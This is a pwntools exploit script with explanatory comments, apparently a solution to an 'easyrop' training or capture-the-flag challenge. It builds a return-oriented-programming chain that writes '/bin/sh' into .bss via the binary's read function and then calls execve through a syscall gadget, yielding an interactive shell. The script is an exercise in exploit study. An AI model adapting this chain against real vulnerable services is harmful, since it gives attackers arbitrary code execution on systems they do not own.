from pwn import *
import time

import sys
sys.path.append('../../')
import pwnutil as util

#context.terminal = ['tmux', 'splitw', '-h']
# Connect to remote machine
#r = remote("training.jinblack.it", 2015)

r = process("./easyrop") 

''' not attaching to remote
	b *0x400291

gdb.attach(r, """ 
	c
        """)
  '''

'''
EXPLANATION
- Ints are 32 bits but addresses 64, so writing an address to the stack is done in 2 steps.
	- Each loop, the program writes 4 bytes (int) to the stack, the value written is the sum of the 2 ints sent
	- So we first send the first half of the address we want to write, and on the next loop the second half
		- Since the sum is written, each loop we send the value and a 0.

- So, libc is not linked.
	- We can use syscalls to read, write, execve, etc.
	- We need gadgets for this (see below)

- Also, the program has read and write functions so we can call them.

- rop: Call read to write /bin/sh\0 into a bss variable and then syscall to execve with the address of that variable
	- Pad out until the eip
	- write gadget_1 adsress to prep registers for read function
	- write data for the registers (read function arguments, see code below)
	- write programs read function address
		- we will have to input /bin/sh\0 when this is executed
	- write gadget_1 address to prep registers for syscall
	- write data for the registers
	- write gadget_2 address

Finding a gadget for calling read and execve (preparing registers and syscall):
gadget_1:
ROPgadget --binary easyrop | grep "pop"
0x00000000004001c2 : pop rdi ; pop rsi ; pop rdx ; pop rax ; ret

gdb:
x/5i 0x4001c2
   0x4001c2 <main+10>:	pop    rdi
   0x4001c3 <main+11>:	pop    rsi
   0x4001c4 <main+12>:	pop    rdx
   0x4001c5 <main+13>:	pop    rax
   0x4001c6 <main+14>:	ret   

gadget_2:
ROPgadget --binary easyrop | grep "syscall"
0x0000000000400168 : syscall

- note that the syscall gadget doesn't return, we dont care since we are using it only at the end.

'''

input("wait, proceed to send exploit")

print(r.clean())

'''
Refering to the bytes needed in order for the program to write 64 bits to the stack as chunks
Note that each time the program reads, it reads 4 bytes. We can send a large string and it will just consume 4 chars each read.
'''

# These 2 can be found in ghidra since no PIE
bss_address = 0x600370 # we will write \bin\sh here
read_address = 0x400144 # address of the read function in the binary

# Need to go up 14 slots in the stack
padding = (b'\x00' * 4 + b'\x00' * 4) * 14 

def to_chunk(address):
	return p32(address) + b'\x00' * 12

# pop rdi ; pop rsi ; pop rdx ; pop rax ; ret
pop_gadget_chunk = to_chunk(0x4001c2)

# execve(char *name, char *argv, char *arvp) | rax = 0x3b (rdi, rsi, rdx)
syscall_gadget_chunk = to_chunk(0x400168)
binsh_address_chunk = to_chunk(bss_address)
empty_args_chunk = to_chunk(0x0) * 2 # we dont care about rsi and rdx
execve_rax_chunk = to_chunk(0x3b)
execve_syscall_args = binsh_address_chunk + empty_args_chunk + execve_rax_chunk

# read(int fd, char *buf, size_t count) | rax = 0x00<not needed, we are using the one in the binary> (rdi, rsi, rdx)
# the read function in the binary is basically the same as the system one, just syscalls and returns
read_address_chunk = to_chunk(read_address)
read_arg1_chunk = to_chunk(0x0) # stdin
read_arg2_chunk = to_chunk(bss_address) # read into the bss variable
read_arg3_chunk = to_chunk(8) # read 8 chars
read_rax_chunk = to_chunk(0x0) # not important, but it would work if we did a syscall instead
read_function_args = read_arg1_chunk + read_arg2_chunk + read_arg3_chunk + read_rax_chunk

exploit = padding + pop_gadget_chunk + read_function_args + read_address_chunk + pop_gadget_chunk + execve_syscall_args + syscall_gadget_chunk

r.send(exploit) 

input("wait, proceed to end explit")

r.clean()

# send 2 empty lines so we exit the loop and main returns.
r.send(b'\0')
time.sleep(0.01)
r.send(b'\0')
time.sleep(0.01)
r.clean()

input("wait, proceed to send /bin/sh\\0")

# read is called, input /bin/sh\0 so its written into the bss variable
r.send(b'/bin/sh\0')

r.interactive()

